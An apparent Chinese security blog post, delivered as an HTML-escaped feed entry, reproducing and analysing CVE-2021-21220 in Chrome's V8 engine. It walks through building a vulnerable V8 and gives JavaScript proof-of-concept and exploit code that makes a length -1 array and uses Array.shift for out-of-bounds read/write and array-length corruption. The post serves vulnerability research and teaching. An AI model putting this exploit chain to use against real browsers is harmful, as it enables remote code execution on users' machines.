        <id>https://tangzichengcc.github.io/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</id>
        <title>CVE-2021-21220 Chrome v8远程代码执行漏洞复现与分析</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
        <content type="html">&lt;h1 id=&#34;tips&#34;&gt;&lt;a href=&#34;#tips&#34; class=&#34;headerlink&#34; title=&#34;tips:&#34;&gt;&lt;/a&gt;tips:&lt;/h1&gt;&lt;p&gt;标记为橙色的为不严谨,有待研究&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;V8-漏洞利用之环境搭建&#34;&gt;&lt;a href=&#34;#V8-漏洞利用之环境搭建&#34; class=&#34;headerlink&#34; title=&#34;V8 漏洞利用之环境搭建&#34;&gt;&lt;/a&gt;&lt;strong&gt;&lt;strong&gt;V8 漏洞利用之环境搭建&lt;/strong&gt;&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&#34;一、编译环境搭建&#34;&gt;&lt;a href=&#34;#一、编译环境搭建&#34; class=&#34;headerlink&#34; title=&#34;一、编译环境搭建&#34;&gt;&lt;/a&gt;一、编译环境搭建&lt;/h2&gt;&lt;p&gt;以下都出自这篇文章:&lt;a href=&#34;https://zhuanlan.zhihu.com/p/493674086&#34;&gt;https://zhuanlan.zhihu.com/p/493674086&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;更新软件列表、更新软件、安装依赖&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get update&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get upgrade&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install bison cdbs curl flex g++ git python vim pkg-config&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;安装depot_tools&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mkdir /root/tools &amp;amp;&amp;amp; cd /root/tools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git clone https:&lt;span class=&#34;comment&#34;&gt;//chromium.googlesource.com/chromium/tools/depot_tools.git /root/tools/depot_tools&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &lt;span class=&#34;string&#34;&gt;&amp;#x27;export PATH=$PATH:&amp;quot;/root/tools/depot_tools&amp;quot;&amp;#x27;&lt;/span&gt; &amp;gt;&amp;gt; /etc/profile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &lt;span class=&#34;string&#34;&gt;&amp;#x27;export PATH=$PATH:&amp;quot;/root/tools/depot_tools&amp;quot;&amp;#x27;&lt;/span&gt; &amp;gt;&amp;gt; ~/.bashrc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;source /etc/profile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;source ~/.bashrc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;安装ninja：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;git clone https:&lt;span class=&#34;comment&#34;&gt;//github.com/ninja-build/ninja.git&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd ninja &amp;amp;&amp;amp; ./configure.py --bootstrap &amp;amp;&amp;amp; cd ..&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &lt;span class=&#34;string&#34;&gt;&amp;#x27;export PATH=$PATH:&amp;quot;$(pwd)/ninja&amp;quot;&amp;#x27;&lt;/span&gt; &amp;gt;&amp;gt; ~/.bashrc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;下载v8&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mkdir /root/v8 &amp;amp;&amp;amp; cd /root/v8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fetch v8  #这个可能会花很长时间，取决于个人的网络环境，如果中断了则 gclient sync同步&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd v8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo ./build/install-build-deps.sh --no-chromeos-fonts	# 在linux系统中这个命令是需要的&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;二、找漏洞版本commit&#34;&gt;&lt;a href=&#34;#二、找漏洞版本commit&#34; class=&#34;headerlink&#34; title=&#34;二、找漏洞版本commit&#34;&gt;&lt;/a&gt;二、找漏洞版本commit&lt;/h2&gt;&lt;p&gt;编译的话,需要找到漏洞版本的github的commit&lt;/p&gt;
&lt;p&gt;受影响的Chrome最高版本为：&lt;code&gt;89.0.4389.114&lt;/code&gt;受影响的V8最高版本为：&lt;code&gt;8.9.255.24&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;方法一&#34;&gt;&lt;a href=&#34;#方法一&#34; class=&#34;headerlink&#34; title=&#34;方法一&#34;&gt;&lt;/a&gt;方法一&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://omahaproxy.appspot.com/&#34;&gt;https://omahaproxy.appspot.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过这个网站可以找漏洞版本的commit&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_1.png&#34; alt=&#34;Untitled_1&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;方法二&#34;&gt;&lt;a href=&#34;#方法二&#34; class=&#34;headerlink&#34; title=&#34;方法二&#34;&gt;&lt;/a&gt;方法二&lt;/h3&gt;&lt;p&gt;从漏洞的issue链接&lt;a href=&#34;https://bugs.chromium.org/p/chromium/issues/detail?id=821137&#34;&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=821137&lt;/a&gt;&lt;br&gt;找到修复的commit链接&lt;a href=&#34;https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d&#34;&gt;https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d&lt;/a&gt; ,可以看到漏洞信息、存在漏洞的上一个版本（parent）、diff修复信息和漏洞poc&lt;/p&gt;
&lt;h3 id=&#34;方法三&#34;&gt;&lt;a href=&#34;#方法三&#34; class=&#34;headerlink&#34; title=&#34;方法三&#34;&gt;&lt;/a&gt;方法三&lt;/h3&gt;&lt;p&gt;直接从github找commit&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/v8/v8/tags?after=8.9.255&#34;&gt;https://github.com/v8/v8/tags?after=8.9.255&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;三、编译&#34;&gt;&lt;a href=&#34;#三、编译&#34; class=&#34;headerlink&#34; title=&#34;三、编译&#34;&gt;&lt;/a&gt;三、编译&lt;/h2&gt;&lt;p&gt;分了两个版本,一个是release,一个是debug&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;进入到v8目录,选择好要编译的commit(不然默认编译最新的)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gclient sync # 同步更新&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 编译可执行文件 (二选一)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tools/dev/v8gen.py x64.debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ninja -C out.gn/x64.debug d8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;上面和下面是二选一&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tools/dev/v8gen.py x64.relase&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ninja -C out.gn/x64.relase d8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这里有个坑,就是,debug版本会有很多调试信息,release没有,并且,release不能使用v8的gdb脚本(如job命令),如果想要release能使用gdb脚本的话,需要执行完&lt;code&gt;tools/dev/v8gen.py x64.release&lt;/code&gt;后在生成的 &lt;code&gt;out.gn/x64.release/args.gn&lt;/code&gt;中追加&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;v8_enable_backtrace = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;v8_enable_disassembler = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;v8_enable_object_print = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;v8_enable_verify_heap = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;参考:&lt;a href=&#34;https://www.cjovi.icu/CVE/1586.html&#34;&gt;https://www.cjovi.icu/CVE/1586.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;四、配置v8自带的gdb脚本-方便调试&#34;&gt;&lt;a href=&#34;#四、配置v8自带的gdb脚本-方便调试&#34; class=&#34;headerlink&#34; title=&#34;四、配置v8自带的gdb脚本,方便调试&#34;&gt;&lt;/a&gt;四、配置v8自带的gdb脚本,方便调试&lt;/h2&gt;&lt;p&gt;v8自带了gdb调试脚本&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_2.png&#34; alt=&#34;Untitled_2&#34;&gt;&lt;/p&gt;
&lt;p&gt;1.把v8&amp;#x2F;tools&amp;#x2F;gdbinit内容加到~&amp;#x2F;.gdbint里面&lt;/p&gt;
&lt;p&gt;2.将v8&amp;#x2F;tools&amp;#x2F;gdb-v8-support.py放到一个目录(当前也行)&lt;/p&gt;
&lt;p&gt;在~&amp;#x2F;.gdbint开头加入 &lt;code&gt;source /自定义目录/gdb-v8-support.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;参考:&lt;a href=&#34;https://paper.seebug.org/1821/&#34;&gt;https://paper.seebug.org/1821/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;RCE的完整步骤&#34;&gt;&lt;a href=&#34;#RCE的完整步骤&#34; class=&#34;headerlink&#34; title=&#34;RCE的完整步骤&#34;&gt;&lt;/a&gt;RCE的完整步骤&lt;/h1&gt;&lt;h2 id=&#34;incorrect-numeric-理解漏洞本身&#34;&gt;&lt;a href=&#34;#incorrect-numeric-理解漏洞本身&#34; class=&#34;headerlink&#34; title=&#34;incorrect numeric (理解漏洞本身)&#34;&gt;&lt;/a&gt;incorrect numeric (理解漏洞本身)&lt;/h2&gt;&lt;p&gt;POC&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; _arr = new Uint32Array([&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;**&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function &lt;span class=&#34;title function_&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(a)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var x = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x = (_arr[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] ^ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x = Math.&lt;span class=&#34;built_in&#34;&gt;abs&lt;/span&gt;(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x -= &lt;span class=&#34;number&#34;&gt;2147483647&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x = Math.max(x, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x -= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(x==&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;) x = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var arr = new Array(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    arr.shift();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var cor = [&lt;span class=&#34;number&#34;&gt;1.1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1.2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1.3&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; [arr, cor];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/1850/&#34;&gt;https://paper.seebug.org/1850/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/1556/&#34;&gt;https://paper.seebug.org/1556/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;那么 这个长度-1的数组有什么用呢??????,见下面 Array.shift&lt;/p&gt;
&lt;h2 id=&#34;OOB-out-of-bounds-memory-access-越界访问&#34;&gt;&lt;a href=&#34;#OOB-out-of-bounds-memory-access-越界访问&#34; class=&#34;headerlink&#34; title=&#34;OOB (out-of-bounds memory access) 越界访问&#34;&gt;&lt;/a&gt;OOB (out-of-bounds memory access) 越界访问&lt;/h2&gt;&lt;p&gt;abusing array bounds check elimination.&lt;/p&gt;
&lt;p&gt;有历史沿革,之前是&lt;a href=&#34;https://chromium.googlesource.com/v8/v8.git/+/7bb6dc0e06fa158df508bc8997f0fce4e33512a5&#34;&gt;bounds-check elimination&lt;/a&gt;的问题,后来去掉了,但又有新的利用方式&lt;/p&gt;
&lt;h3 id=&#34;利用Array-shift实现oob&#34;&gt;&lt;a href=&#34;#利用Array-shift实现oob&#34; class=&#34;headerlink&#34; title=&#34;利用Array.shift实现oob&#34;&gt;&lt;/a&gt;利用Array.shift实现oob&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://bugs.chromium.org/p/chromium/issues/detail?id=1198696&#34;&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=1198696&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;而负长度被视为一个正的大长度,因此该数组允许访问任意 OOB 数据。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;function &lt;span class=&#34;title function_&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(a)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        let x = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (a) x = &lt;span class=&#34;number&#34;&gt;0xFFFFFFFF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        var arr = new Array(Math.sign(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; - Math.max(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, x, &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;)));&lt;span class=&#34;comment&#34;&gt;//构造长度为-1的数组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        arr.shift();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        let local_arr = Array(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        console.&lt;span class=&#34;built_in&#34;&gt;log&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;现在长度&amp;quot;&lt;/span&gt;+arr.length)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        local_arr[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;5.1&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//4014666666666666&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        let buff = new LeakArrayBuffer(&lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//byteLength idx=8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        arr[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;0x1122&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; [arr, local_arr, buff];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (var i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;0x10000&lt;/span&gt;; ++i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        foo(&lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gc(); gc(); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    [corrput_arr, rwarr, corrupt_buff] = foo(&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		corrput_arr[&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;0x22444&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		delete corrput_arr;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;  通过上述漏洞,我们实现了一个长度为-1的数组arr(corrput_arr),-1扩展为无符号,就是0xffffffff,是一个很大的正数,从而可以实现越界读写,在此基础之上,进行后面的利用&lt;/p&gt;
&lt;p&gt;  1.获得了一个0xfffffff(-1长度)数组 arr(corrput_arr)&lt;/p&gt;
&lt;p&gt;  2.声明一个local_arr(rwarr),长度为2, 接着利用arr的oob,溢出修改它的长度为0x22444,也就是corrput_arr[12] &amp;#x3D; 0x22444; (或者说 arr[12] &amp;#x3D; 0x22444;) 这一位对应的是数组的长度&lt;/p&gt;
&lt;p&gt;  3.声明长度为0x1000的ArrayBuffer(corrupt_buff)&lt;/p&gt;
&lt;p&gt;  在2、3两步,我们能够得到一个数组和一个ArrayBuffer,但是我们还不能任意读写这个ArrayBuffer,一种实现方法是,通过corrput_arr的溢出,将rwarr的长度变长,覆盖到ArrayBuffer,于是我们就能够对他进行任意读写,从而实现对内存任意地址读写(其实是受限的,rwx)&lt;/p&gt;
&lt;p&gt;  为什么要强调ArrayBuffer呢?且看下面&lt;/p&gt;
&lt;p&gt;  疑问:从而实现对rwarr(local_arr)的跨界访问,为啥要这样呢?? 为啥不直接用arr&lt;/p&gt;
